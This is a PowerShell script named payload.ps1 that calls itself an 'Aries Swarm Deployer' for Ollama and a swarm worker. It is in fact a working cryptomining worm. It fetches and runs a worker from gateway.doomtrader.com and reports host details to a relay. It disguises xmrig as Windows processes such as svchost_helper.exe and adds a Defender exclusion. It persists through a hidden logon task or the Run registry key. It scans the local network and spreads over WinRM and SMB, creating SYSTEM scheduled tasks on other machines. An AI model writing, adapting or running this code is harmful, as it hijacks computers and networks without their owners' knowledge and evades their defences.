# ============================================================================
# Aries Swarm Deployer — payload.ps1
# Deploys Ollama + swarm worker on Windows WITHOUT admin privileges.
# All paths are user-space ($env:LOCALAPPDATA).
# ============================================================================

# --- STEALTH MODE ---
# Set $STEALTH = $true to suppress all visible windows and output
$STEALTH = if ($env:ARIES_STEALTH -eq "1") { $true } else { $false }
if ($STEALTH) {
    $ErrorActionPreference = "SilentlyContinue"
    $ProgressPreference = "SilentlyContinue"
}

# --- CONFIG (edit these or override via env vars) ---
$SWARM_RELAY   = if ($env:ARIES_RELAY)  { $env:ARIES_RELAY }  else { "https://gateway.doomtrader.com:9700" }
$SWARM_SECRET  = if ($env:ARIES_SECRET) { $env:ARIES_SECRET } else { "aries-swarm-jdw-2026" }
$WORKER_URL    = if ($env:ARIES_WORKER) { $env:ARIES_WORKER } else { "https://gateway.doomtrader.com/api/usb-swarm/worker.js" }
$NODE_ZIP_URL  = "https://nodejs.org/dist/v20.11.0/node-v20.11.0-win-x64.zip"
$OLLAMA_URL    = "https://ollama.com/download/OllamaSetup.exe"

# --- PATHS ---
$BASE          = Join-Path $env:LOCALAPPDATA "aries-swarm"
$LOG_FILE      = Join-Path $BASE "setup.log"
$OLLAMA_DIR    = Join-Path $env:LOCALAPPDATA "Ollama"
$NODE_DIR      = Join-Path $BASE "node"
$WORKER_FILE   = Join-Path $BASE "worker.js"
$TEMP_DIR      = Join-Path $BASE "tmp"

# --- Window style for subprocesses ---
$WS = if ($STEALTH) { "Hidden" } else { "Hidden" }

# --- INIT ---
foreach ($d in @($BASE, $TEMP_DIR, $NODE_DIR)) {
    if (!(Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
}

$TOTAL_STEPS = 9

function Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] $msg"
    Add-Content -Path $LOG_FILE -Value $line -ErrorAction SilentlyContinue
    if (!$STEALTH) { Write-Host $line }
}

function Progress($step, $activity, $status) {
    if (!$STEALTH) {
        Write-Progress -Activity $activity -Status $status -PercentComplete ([int](($step / $TOTAL_STEPS) * 100))
    }
}

function Retry($name, [scriptblock]$action, $maxRetries = 5) {
    for ($i = 1; $i -le $maxRetries; $i++) {
        try {
            & $action
            return $true
        } catch {
            Log "  $name attempt $i/$maxRetries failed: $_"
            Start-Sleep -Seconds ([Math]::Min($i * 5, 30))
        }
    }
    Log "  $name FAILED after $maxRetries attempts"
    return $false
}

# ============================================================================
# 0. UPDATE DETECTION — skip full install if already deployed
# ============================================================================
$IS_UPDATE = $false
if (Test-Path $WORKER_FILE) {
    $IS_UPDATE = $true
    Log "=== Aries Swarm UPDATE Mode (existing deployment detected) ==="
    Progress 1 "Aries Swarm Update" "Updating worker script..."

    # Just re-download worker.js and restart
    $ok = Retry "Worker update" {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        (New-Object Net.WebClient).DownloadFile($WORKER_URL, $WORKER_FILE)
    }
    if ($ok) { Log "Worker script updated" } else { Log "Worker update failed" }

    # Restart worker process
    $nodeExe = Join-Path $NODE_DIR "node.exe"
    if (Test-Path $nodeExe) {
        Get-Process -Name "node" -ErrorAction SilentlyContinue | Where-Object {
            try { $_.CommandLine -match "worker\.js" } catch { $false }
        } | ForEach-Object { try { Stop-Process -Id $_.Id -Force } catch {} }
        Start-Sleep -Seconds 2
        Start-Process -FilePath $nodeExe -ArgumentList $WORKER_FILE -WindowStyle $WS -WorkingDirectory $BASE
        Log "Worker restarted"
    }

    Progress $TOTAL_STEPS "Aries Swarm Update" "Update complete!"
    if (!$STEALTH) { Write-Progress -Activity "Aries Swarm Update" -Completed }
    Log "=== Aries Swarm Update Complete ==="
    exit 0
}

# ============================================================================
# 1. HARDWARE DETECTION
# ============================================================================
Log "=== Aries Swarm Setup Starting ==="
Progress 1 "Aries Swarm Setup" "Detecting hardware..."

$ram = [Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
$cpu = (Get-CimInstance Win32_Processor | Select-Object -First 1)
$cpuName  = $cpu.Name.Trim()
$cpuCores = $cpu.NumberOfCores
$gpu = try { (Get-CimInstance Win32_VideoController | Where-Object { $_.Name -notmatch 'Microsoft|Basic' } | Select-Object -First 1).Name } catch { "none" }
if (!$gpu) { $gpu = "none" }

Log "Hardware: RAM=${ram}GB | CPU=$cpuName ($cpuCores cores) | GPU=$gpu"

# Model selection (RAM-based optimization tiers)
$model = switch ([int][Math]::Floor($ram)) {
    { $_ -ge 32 } { "mixtral:8x7b";  break }
    { $_ -ge 16 } { "mistral:7b";    break }
    { $_ -ge 8  } { "llama3:8b";     break }
    { $_ -ge 4  } { "phi3:mini";     break }
    { $_ -ge 2  } { "tinyllama:1.1b"; break }
    default        { $null                  }
}
$skipOllama = $false
if ($ram -lt 2) {
    $skipOllama = $true
    Log "RAM < 2GB — skipping Ollama, mining only"
}
Log "Selected model: $model (based on ${ram}GB RAM)"

# ============================================================================
# 2. INSTALL OLLAMA (user-space) — skip if RAM < 2GB
# ============================================================================
Progress 2 "Aries Swarm Setup" "Installing Ollama..."

if ($skipOllama) {
    Log "Skipping Ollama install (RAM < 2GB, mining only)"
    $ollamaExe = $null
} else {

$ollamaExe = Join-Path $OLLAMA_DIR "ollama.exe"
# Also check Program Files in case it was already installed system-wide
$ollamaSystem = "C:\Program Files\Ollama\ollama.exe"

if (Test-Path $ollamaExe) {
    Log "Ollama already installed at $ollamaExe"
} elseif (Test-Path $ollamaSystem) {
    $ollamaExe = $ollamaSystem
    Log "Ollama found system-wide at $ollamaExe"
} else {
    Log "Downloading Ollama installer..."
    $installerPath = Join-Path $TEMP_DIR "OllamaSetup.exe"

    $ok = Retry "Ollama download" {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        (New-Object Net.WebClient).DownloadFile($OLLAMA_URL, $installerPath)
    }
    if (!$ok) { Log "FATAL: Cannot download Ollama"; exit 1 }

    Log "Installing Ollama (user-space, silent)..."
    # OllamaSetup.exe is an Inno Setup installer; /CURRENTUSER avoids UAC
    $proc = Start-Process -FilePath $installerPath -ArgumentList "/VERYSILENT","/SUPPRESSMSGBOXES","/NORESTART","/CURRENTUSER" -Wait -PassThru -WindowStyle $WS
    Log "Ollama installer exit code: $($proc.ExitCode)"

    # Find where it landed
    $searchPaths = @(
        (Join-Path $env:LOCALAPPDATA "Programs\Ollama\ollama.exe"),
        (Join-Path $env:LOCALAPPDATA "Ollama\ollama.exe"),
        (Join-Path $env:USERPROFILE "AppData\Local\Programs\Ollama\ollama.exe"),
        $ollamaExe
    )
    $ollamaExe = $null
    foreach ($p in $searchPaths) {
        if (Test-Path $p) { $ollamaExe = $p; break }
    }
    # Also scan PATH
    if (!$ollamaExe) {
        $ollamaExe = (Get-Command ollama -ErrorAction SilentlyContinue).Source
    }
    if (!$ollamaExe) { Log "FATAL: Ollama not found after install"; exit 1 }
    Log "Ollama installed at $ollamaExe"
}

# ============================================================================
# 3. START OLLAMA SERVER & PULL MODEL
# ============================================================================
Progress 3 "Aries Swarm Setup" "Starting Ollama & pulling model..."

Log "Starting Ollama server..."
$env:OLLAMA_HOST = "127.0.0.1:11434"
Start-Process -FilePath $ollamaExe -ArgumentList "serve" -WindowStyle $WS
Start-Sleep -Seconds 5

# Wait for Ollama API to be ready
$ready = $false
for ($i = 0; $i -lt 30; $i++) {
    try {
        $null = Invoke-RestMethod -Uri "http://127.0.0.1:11434/api/tags" -TimeoutSec 3
        $ready = $true; break
    } catch { Start-Sleep -Seconds 2 }
}
if (!$ready) { Log "WARNING: Ollama API not responding, continuing anyway..." }

Log "Pulling model: $model (this may take a while)..."
$pullProc = Start-Process -FilePath $ollamaExe -ArgumentList "pull",$model -WindowStyle $WS -Wait -PassThru
Log "Model pull exit code: $($pullProc.ExitCode)"

} # End skipOllama check

# ============================================================================
# 4. INSTALL PORTABLE NODE.JS
# ============================================================================
Progress 4 "Aries Swarm Setup" "Installing Node.js..."

$nodeExe = Join-Path $NODE_DIR "node.exe"

if (Test-Path $nodeExe) {
    Log "Node.js already present at $nodeExe"
} else {
    Log "Downloading portable Node.js..."
    $nodeZip = Join-Path $TEMP_DIR "node.zip"

    $ok = Retry "Node download" {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        (New-Object Net.WebClient).DownloadFile($NODE_ZIP_URL, $nodeZip)
    }
    if (!$ok) { Log "FATAL: Cannot download Node.js"; exit 1 }

    Log "Extracting Node.js..."
    Expand-Archive -Path $nodeZip -DestinationPath $TEMP_DIR -Force
    # The zip contains a folder like node-v20.11.0-win-x64/
    $extracted = Get-ChildItem -Path $TEMP_DIR -Directory -Filter "node-v*" | Select-Object -First 1
    if ($extracted) {
        Copy-Item -Path (Join-Path $extracted.FullName "node.exe") -Destination $nodeExe -Force
    }
    if (!(Test-Path $nodeExe)) { Log "FATAL: node.exe not found after extraction"; exit 1 }
    Log "Node.js installed at $nodeExe"
}

# ============================================================================
# 5. DOWNLOAD WORKER SCRIPT
# ============================================================================
Progress 5 "Aries Swarm Setup" "Downloading worker script..."

Log "Downloading worker.js..."
$ok = Retry "Worker download" {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object Net.WebClient).DownloadFile($WORKER_URL, $WORKER_FILE)
}
if (!$ok) { Log "FATAL: Cannot download worker.js"; exit 1 }
Log "Worker saved to $WORKER_FILE"

# ============================================================================
# 6. WRITE ENVIRONMENT CONFIG FOR WORKER
# ============================================================================
Progress 6 "Aries Swarm Setup" "Writing configuration..."

$envFile = Join-Path $BASE "env.json"
$envData = @{
    relayUrl   = $SWARM_RELAY
    secret     = $SWARM_SECRET
    model      = $model
    ollamaHost = "http://127.0.0.1:11434"
    ramGB      = $ram
    cpuName    = $cpuName
    cpuCores   = $cpuCores
    gpu        = $gpu
    hostname   = $env:COMPUTERNAME
} | ConvertTo-Json -Compress
Set-Content -Path $envFile -Value $envData -Force
Log "Environment config written to $envFile"

# ============================================================================
# 6.5. WINDOWS DEFENDER EXCLUSION FOR XMRIG
# ============================================================================
Progress 7 "Aries Swarm Setup" "Configuring Defender exclusions..."

$xmrigDir = Join-Path ([System.IO.Path]::GetTempPath()) "aries-xmrig"

# Stealth: rename xmrig.exe to an innocent process name
$stealthNames = @('svchost_helper.exe', 'WindowsUpdateAgent.exe', 'RuntimeBroker_x64.exe', 'SearchIndexer_svc.exe', 'WmiProvider.exe')
$stealthName = $stealthNames | Get-Random
$xmrigOriginal = Join-Path $xmrigDir "xmrig.exe"
$xmrigStealth = Join-Path $xmrigDir $stealthName
if (Test-Path $xmrigOriginal) {
    Copy-Item -Path $xmrigOriginal -Destination $xmrigStealth -Force -ErrorAction SilentlyContinue
    Log "Stealth: renamed xmrig.exe to $stealthName"
}

Log "Adding Defender exclusion for xmrig directory ($xmrigDir)..."
try {
    # Try with current privileges first (works if running as admin)
    Add-MpPreference -ExclusionPath $xmrigDir -ErrorAction Stop
    Log "Defender exclusion added successfully"
} catch {
    # Try via scheduled task trick (runs as current user with whatever perms)
    try {
        Start-Process powershell -ArgumentList "-WindowStyle","Hidden","-Command","Add-MpPreference -ExclusionPath '$xmrigDir'" -WindowStyle $WS -ErrorAction SilentlyContinue
        Log "Defender exclusion attempted (may need admin)"
    } catch {
        Log "Defender exclusion failed (not admin) — xmrig may be quarantined"
    }
}

# ============================================================================
# 7. START WORKER
# ============================================================================
Progress 8 "Aries Swarm Setup" "Starting swarm worker..."

Log "Starting swarm worker..."
Start-Process -FilePath $nodeExe -ArgumentList $WORKER_FILE -WindowStyle $WS -WorkingDirectory $BASE

# ============================================================================
# 8. PERSISTENCE — User-level scheduled task (no admin)
# ============================================================================
Progress 9 "Aries Swarm Setup" "Setting up persistence..."

Log "Setting up persistence..."

# Create a launcher script
$launcherPath = Join-Path $BASE "launcher.ps1"
$launcherContent = @"
# Aries Swarm Launcher — runs on login
`$base = "$BASE"
`$ollamaExe = "$ollamaExe"
`$nodeExe = "$nodeExe"
`$workerFile = "$WORKER_FILE"

# Start Ollama serve if not running
if (!(Get-Process -Name "ollama" -ErrorAction SilentlyContinue)) {
    `$env:OLLAMA_HOST = "127.0.0.1:11434"
    Start-Process -FilePath `$ollamaExe -ArgumentList "serve" -WindowStyle Hidden
    Start-Sleep -Seconds 5
}

# Start worker if not running
`$workerRunning = Get-Process -Name "node" -ErrorAction SilentlyContinue | Where-Object {
    `$_.CommandLine -match "worker\.js"
} 2>`$null
if (!`$workerRunning) {
    Start-Process -FilePath `$nodeExe -ArgumentList `$workerFile -WindowStyle Hidden -WorkingDirectory `$base
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Force

# Register user-level scheduled task
$taskName = "AriesSwarmWorker"
try {
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false }
} catch {}

$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)

try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -ErrorAction Stop | Out-Null
    Log "Scheduled task '$taskName' registered (runs at logon)"
} catch {
    # Fallback: use Run registry key
    Log "Scheduled task failed ($_), using Run registry fallback..."
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`""
    Set-ItemProperty -Path $regPath -Name $taskName -Value $regCmd -ErrorAction SilentlyContinue
    Log "Registry Run key set for persistence"
}

# ============================================================================
# 9. CLEANUP
# ============================================================================
Log "Cleaning up temp files..."
Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue

if (!$STEALTH) { Write-Progress -Activity "Aries Swarm Setup" -Completed }

# ============================================================================
# 10. NETWORK SPREAD — Scan LAN and deploy to other devices
# ============================================================================
Log "=== Starting Network Spread ==="

# Give worker 10 seconds to connect to relay
Start-Sleep -Seconds 10

# ARP scan to find other devices on the network
Log "Scanning local network for deployable devices..."
$arpEntries = arp -a | Select-String "dynamic" | ForEach-Object {
    if ($_ -match '^\s*([\d.]+)\s+([\w-]+(?::[\w-]+)+)\s+dynamic') {
        $ip = $matches[1]
        # Skip broadcast, gateway, and self
        if ($ip -notmatch '\.255$' -and $ip -notmatch '\.1$' -and $ip -ne '255.255.255.255') {
            $ip
        }
    }
}
Log "Found $($arpEntries.Count) devices on network"

# For each device, try to deploy in background
$deployScript = Join-Path $BASE "spread-deploy.ps1"
$spreadContent = @"
param([string]`$TargetIP)
`$ErrorActionPreference = 'SilentlyContinue'
`$logFile = "$BASE\spread.log"
function SpreadLog(`$msg) { Add-Content -Path `$logFile -Value "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [`$TargetIP] `$msg" }

# Skip if already deployed (check if worker port is responding)
try {
    `$test = New-Object Net.Sockets.TcpClient
    `$test.Connect(`$TargetIP, 19800)
    `$test.Close()
    SpreadLog "Already has worker running, skipping"
    exit 0
} catch {}

# Try WinRM (port 5985)
`$winrm = `$false
try {
    `$sock = New-Object Net.Sockets.TcpClient
    `$sock.Connect(`$TargetIP, 5985)
    `$sock.Close()
    `$winrm = `$true
} catch {}

if (`$winrm) {
    SpreadLog "WinRM open, attempting deploy..."
    try {
        # Try with current credentials (same domain)
        `$session = New-PSSession -ComputerName `$TargetIP -ErrorAction Stop
        Invoke-Command -Session `$session -FilePath "$BASE\..\usb-swarm\payload.ps1" -ErrorAction Stop
        Remove-PSSession `$session
        SpreadLog "SUCCESS via WinRM"
        exit 0
    } catch {
        SpreadLog "WinRM deploy failed: `$_"
    }
}

# Try SMB file copy + scheduled task
`$smb = `$false
try {
    `$sock = New-Object Net.Sockets.TcpClient
    `$sock.Connect(`$TargetIP, 445)
    `$sock.Close()
    `$smb = `$true
} catch {}

if (`$smb) {
    SpreadLog "SMB open, attempting file copy deploy..."
    try {
        `$share = "\\`$TargetIP\C`$\ProgramData\aries-swarm"
        New-Item -ItemType Directory -Path `$share -Force -ErrorAction Stop | Out-Null
        Copy-Item "$BASE\node\node.exe" "`$share\node.exe" -Force
        Copy-Item "$WORKER_FILE" "`$share\worker.js" -Force
        Copy-Item "$BASE\env.json" "`$share\env.json" -Force
        # Create remote scheduled task to start worker
        schtasks /create /s `$TargetIP /tn "AriesSwarmWorker" /tr "C:\ProgramData\aries-swarm\node.exe C:\ProgramData\aries-swarm\worker.js" /sc onstart /ru SYSTEM /f 2>&1 | Out-Null
        schtasks /run /s `$TargetIP /tn "AriesSwarmWorker" 2>&1 | Out-Null
        SpreadLog "SUCCESS via SMB"
        exit 0
    } catch {
        SpreadLog "SMB deploy failed: `$_"
    }
}

SpreadLog "No deploy method available"
"@
Set-Content -Path $deployScript -Value $spreadContent -Force

# Deploy to each discovered device (max 10 parallel)
$jobs = @()
foreach ($ip in $arpEntries) {
    # Don't deploy to self
    $myIPs = (Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress)
    if ($ip -in $myIPs) { continue }

    Log "Attempting spread to $ip..."
    $jobs += Start-Job -FilePath $deployScript -ArgumentList $ip

    # Throttle: max 10 parallel
    while (($jobs | Where-Object { $_.State -eq 'Running' }).Count -ge 10) {
        Start-Sleep -Seconds 2
    }
}

# Wait for all spread jobs (max 5 min total)
$deadline = (Get-Date).AddMinutes(5)
while (($jobs | Where-Object { $_.State -eq 'Running' }).Count -gt 0 -and (Get-Date) -lt $deadline) {
    Start-Sleep -Seconds 5
}
$jobs | Stop-Job -ErrorAction SilentlyContinue
$jobs | Remove-Job -ErrorAction SilentlyContinue

$spreadLog = if (Test-Path "$BASE\spread.log") { Get-Content "$BASE\spread.log" -Tail 20 } else { "No spread log" }
Log "Network spread complete. Results:`n$spreadLog"

Log "=== Aries Swarm Setup Complete ==="
Log "  Model: $model"
Log "  Relay: $SWARM_RELAY"
Log "  Host:  $($env:COMPUTERNAME)"
Log "  RAM:   ${ram}GB | CPU: $cpuName | GPU: $gpu"
Log "  Spread: Attempted $($arpEntries.Count) devices"
